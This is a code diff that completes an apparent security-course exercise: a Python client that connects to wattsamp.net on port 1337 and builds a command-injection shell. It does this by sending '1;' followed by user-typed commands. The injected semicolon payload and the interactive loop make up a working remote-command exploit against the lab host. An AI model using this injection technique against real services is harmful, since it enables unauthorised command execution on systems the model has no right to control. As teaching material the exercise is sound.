@@ -8,11 +8,18 @@
 """
 
 import socket
+import subprocess
 
 host = "wattsamp.net" # IP address here
 port = 1337 # Port here
 
 def execute_cmd(cmd):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    data = s.recv(1024)
+    s.send("1;"+cmd+"\n")
+    data = s.recv(1024)
+    print(data)
     """
         Sockets: https://docs.python.org/3/library/socket.html
         How to use the socket s:
@@ -30,8 +37,16 @@ def execute_cmd(cmd):
 
                 s.send("something to send\n")   # Send a newline \n at the end of your command
     """
-    print("IMPLEMENT ME")
 
+def main():
+    while True:
+        command = raw_input("> ")
+        if (command == "exit" or command == "quit"):
+            break
+        elif command == "help":
+            print("Show this help menu")
+        else:
+            execute_cmd(command)
 
-if __name__ == '__main__':
-    print("IMPLEMENT ME")
+if '__main__' == __name__:
+    main()
